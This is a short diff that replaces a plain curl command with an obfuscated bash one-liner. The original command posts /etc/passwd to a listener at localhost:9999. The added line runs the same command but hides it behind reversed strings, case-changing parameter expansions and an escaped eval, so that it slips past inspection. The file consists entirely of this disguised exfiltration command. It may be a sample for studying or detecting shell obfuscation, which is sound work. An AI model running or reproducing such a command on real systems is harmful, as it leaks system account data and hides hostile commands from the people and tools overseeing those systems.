@@ -1,1 +1,2 @@
-curl -X POST -F f=@"/etc/passwd" localhost:9999
+e${*~~}v${*,,}a\l "$(oL='$bash"${@}" <<< "$(\REV <<<'"'"'
+9999:TSOHLACOL "DWSSAP/CTE/"@=F f- tsop x- LRUC'"'"';)"'${*##\(G}&&${@^^}print"f" %s "${oL~~}";)"
